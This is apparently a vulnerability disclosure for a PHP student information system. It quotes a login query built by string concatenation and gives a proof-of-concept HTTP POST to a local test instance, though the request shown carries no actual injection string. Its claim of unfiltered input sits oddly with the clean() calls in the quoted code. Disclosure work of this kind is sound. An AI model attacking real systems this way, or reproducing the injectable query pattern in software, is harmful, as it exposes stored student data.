# Student Information System

## supplier 
https://code-projects.org/student-information-system-in-php-with-source-code-2/
## Vulnerability file
index.php

## describe

**Code analysis**   

In the index.php file of Student Information System, theuser username parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 10-15 in index.php

```php
$uname = clean($_POST['username']);
$pword = clean($_POST['password']);
$query = "SELECT * FROM students WHERE username = '$uname' AND password = '$pword'";
 $result = mysqli_query($con, $query);
```

## POC

```
POST /Stu/studentinfosystem/index.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 34
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/Stu/studentinfosystem/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=pdtmrbifdaoihek22bub5ecasu
Connection: close

username=1&password=1&login=Log+In

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/62573215fb71c379008398bf43436254.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/c0c5781181623d80083e3db2b289522b.png)